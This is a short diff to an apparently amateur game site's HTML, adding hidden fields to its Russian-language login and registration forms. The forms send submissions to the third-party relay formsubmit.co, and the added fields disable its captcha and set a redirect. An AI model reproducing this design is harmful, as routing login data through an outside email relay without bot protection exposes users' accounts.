@@ -175,6 +175,9 @@
             <!-- Панель 1: Авторизация -->
             <form id="login" class="form-panel active" action="https://formsubmit.co" method="POST">
                 <input type="hidden" name="_subject" value="Попытка Входа на сайт рекордов!">
+                <input type="hidden" name="_captcha" value="false">
+                <input type="hidden" name="_next" value="https://github.io">
+                
                 <div class="form-group">
                     <label>Игровой Никнейм</label>
                     <input type="text" name="Логин_Ник" placeholder="Введи никнейм" required>
@@ -189,6 +192,8 @@
             <!-- Панель 2: Регистрация -->
             <form id="register" class="form-panel" action="https://formsubmit.co" method="POST">
                 <input type="hidden" name="_subject" value="Новая Регистрация аккаунта!">
+                <input type="hidden" name="_captcha" value="false">
+                <input type="hidden" name="_next" value="https://github.io">
                 <div class="form-group">
                     <label>Придумайте Никнейм</label>
                     <input type="text" name="Рег_Ник" placeholder="Например: StickGod" required>
